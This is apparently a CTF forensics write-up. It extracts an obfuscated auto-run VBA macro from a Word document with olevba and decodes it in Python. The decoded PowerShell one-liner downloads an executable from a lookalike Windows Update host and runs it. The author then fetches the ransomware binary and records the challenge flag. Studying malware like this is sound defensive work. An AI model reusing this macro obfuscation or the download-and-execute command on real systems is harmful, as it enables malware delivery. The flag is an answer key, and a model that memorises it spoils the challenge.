## Name: Macro Madness #1 - The Breach
#### Category: Forensics
#### Difficulty: hard
#### Description: Malware was downloaded and ran on one of our executive's workstations. We need your help figuring out where the malware came from, and what it did. IT was able to compile every email attachment containing macros that was received the day of the breach. Find the macro that bypassed antivirus, and figure out what it did.  According to threat intelligence, we suspect the hackers used a large volume of benign macros so a more advanced, malicious one would blend in. 

## Procedure
The chall is talking about some malicious macros used in the breach, we have a lot of office documents with macro, we can use olevba tool to be able to recover the macro code, after ran the command ```olevba Space\ Pirate\ Code\ of\ Conduct.doc```, we got an interesting code in the file "Space Pirate Code of Conduct.doc"<br>

## Macro Content
1) achieve: Takes a parameter believe, performs some arithmetic, and returns a result.
2) retrieve: Takes a parameter relieve, performs string operations using the Left function, and returns a result.
3) perceive: Takes a parameter deceive, performs string operations using the Right function, and returns a result.
4) receive: Takes a parameter conceive, performs a loop with various string manipulations and returns a result.
5) thieve is assigned a long string.
6) sleeve is assigned the result of the receive function when passed thieve.
7) Performs several operations using string manipulations and potentially uses GetObject to interact with external objects, which could be used to execute other code or commands.

```
' Processing file: Space Pirate Code of Conduct.doc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 938 bytes
' Macros/VBA/Module1 - 4293 bytes
' Line #0:
'       FuncDefn (Function Sleep(ByVal mili As Long) As Long)
' Line #1:
' Line #2:
'       FuncDefn (Sub AutoOpen())
' Line #3:
'       ArgsCall MyMacro 0x0000 
' Line #4:
'       EndSub 
' Line #5:
' Line #6:
'       FuncDefn (Sub Document_Open())
' Line #7:
'       ArgsCall MyMacro 0x0000 
' Line #8:
'       EndSub 
' Line #9:
' Line #10:
'       FuncDefn (Function achieve(believe))
' Line #11:
'       Ld believe 
'       LitDI2 0x0010 
'       Sub 
'       ArgsLd Chr 0x0001 
'       St achieve 
' Line #12:
'       EndFunc 
' Line #13:
' Line #14:
'       FuncDefn (Function retrieve(relieve))
' Line #15:
'       Ld relieve 
'       LitDI2 0x0003 
'       ArgsLd Left 0x0002 
'       St retrieve 
' Line #16:
'       EndFunc 
' Line #17:
' Line #18:
'       FuncDefn (Function perceive(deceive))
' Line #19:
'       Ld deceive 
'       Ld deceive 
'       FnLen 
'       LitDI2 0x0003 
'       Sub 
'       ArgsLd Right 0x0002 
'       St perceive 
' Line #20:
'       EndFunc 
' Line #21:
' Line #22:
'       FuncDefn (Function receive(conceive))
' Line #23:
'       Do 
' Line #24:
'       Ld grieve 
'       Ld conceive 
'       ArgsLd retrieve 0x0001 
'       ArgsLd achieve 0x0001 
'       Add 
'       St grieve 
' Line #25:
'       Ld conceive 
'       ArgsLd perceive 0x0001 
'       St conceive 
' Line #26:
'       Ld conceive 
'       FnLen 
'       LitDI2 0x0000 
'       Gt 
'       LoopWhile 
' Line #27:
'       Ld grieve 
'       St receive 
' Line #28:
'       EndFunc 
' Line #29:
' Line #30:
'       FuncDefn (Function MyMacro())
' Line #31:
'       Dim 
'       VarDefn thieve (As String)
' Line #32:
'       Dim 
'       VarDefn sleeve (As String)
' Line #33:
' Line #34:
'       LitStr 0x0306 "128127135117130131120117124124048056089126134127123117061103117114098117129133117131132048055120132132128074063063134134121126116127135131133128116113132117062115127125074072064072064063133128116113132117055048061101131117082113131121115096113130131121126119048061088117113116117130131048080139055120117113130132114117113132055077055073072072069114072064064070067114114071114113071068118071069114070118072113118118066073065114115073065115118113072117114071071116073068066116068067067115073065071072113113073117073073115070118055141048061095133132086121124117048055083074108103121126116127135131108100113131123131108083120130127125117101128116113132117062117136117055057075048083074108103121126116127135131108100113131123131108083120130127125117101128116113132117062117136117"
'       St thieve 
' Line #35:
'       Ld thieve 
'       ArgsLd receive 0x0001 
'       St sleeve 
' Line #36:
'       Ld sleeve 
'       Ld reprieve 
'       Ld naive 
'       Ld believe 
'       LitStr 0x0027 "103121126067066111096130127115117131131"
'       ArgsLd receive 0x0001 
'       LitStr 0x001B "135121126125119125132131074"
'       ArgsLd receive 0x0001 
'       ArgsLd GetObject 0x0001 
'       ArgsMemLd Get 0x0001 
'       ArgsMemCall Create 0x0004 
' Line #37:
' Line #38:
'       EndFunc 
' Line #39:

```
<br>

I have created the following python code to be able to deobfuscate the malicious code
```
malicious_code="128127135117130131120117124124048056089126134127123117061103117114098117129133117131132048055120132132128074063063134134121126116127135131133128116113132117062115127125074072064072064063133128116113132117055048061101131117082113131121115096113130131121126119048061088117113116117130131048080139055120117113130132114117113132055077055073072072069114072064064070067114114071114113071068118071069114070118072113118118066073065114115073065115118113072117114071071116073068066116068067067115073065071072113113073117073073115070118055141048061095133132086121124117048055083074108103121126116127135131108100113131123131108083120130127125117101128116113132117062117136117055057075048083074108103121126116127135131108100113131123131108083120130127125117101128116113132117062117136117"
out=""
for x in range(0,len(malicious_code),3):
    out+=chr(int(malicious_code[x:x+3])-16)

print(out)
```
output
```
powershell (Invoke-WebRequest 'http://vvindowsupdate.com:8080/update' -UseBasicParsing -Headers @{'heartbeat'='9885b80063bb7ba74f75b6f8aff291bc91cfa8eb77d942d433c9178aa9e99c6f'} -OutFile 'C:\Windows\Tasks\ChromeUpdate.exe'); C:\Windows\Tasks\ChromeUpdate.exe
```
<br>

We can see an interesting url (detected in other challs), and a headers value ```heartbeat```, so using that, we can send a get request using heartbeat value ```9885b80063bb7ba74f75b6f8aff291bc91cfa8eb77d942d433c9178aa9e99c6f```, after run it we can get the first flag in headers, and see an exe (ransomware) file, save the exe file, we will need it in next chall.

```
import requests
url="http://vvindowsupdate.com:8080/update"
headers={
    "heartbeat":"9885b80063bb7ba74f75b6f8aff291bc91cfa8eb77d942d433c9178aa9e99c6f"
}
with requests.get(url, stream=True,headers=headers) as res:
    res.raise_for_status()  
    with open("Ransomware.exe", 'wb') as f:
        for chunk in res.iter_content(chunk_size=8192):
            if chunk: 
                f.write(chunk)

print(res.headers)
```

output
```
{'Server': 'Werkzeug/3.0.1 Python/3.12.3', 'Date': 'Sun, 26 May 2024 21:17:49 GMT, Sun, 26 May 2024 21:17:49 GMT', 'Content-Disposition': 'attachment; filename=RansomwareUsingAES-CTR.exe', 'Content-Type': 'application/x-msdos-program', 'Content-Length': '10589460', 'Last-Modified': 'Wed, 22 May 2024 21:13:28 GMT', 'Cache-Control': 'no-cache', 'ETag': '"1716412408.7779915-10589460-4089187576"', 'Flag': 'flag{734b55458dc74fb6d5f5a5082a3920d6}', 'Connection': 'close'}
```

flag ``` flag{734b55458dc74fb6d5f5a5082a3920d6} ```
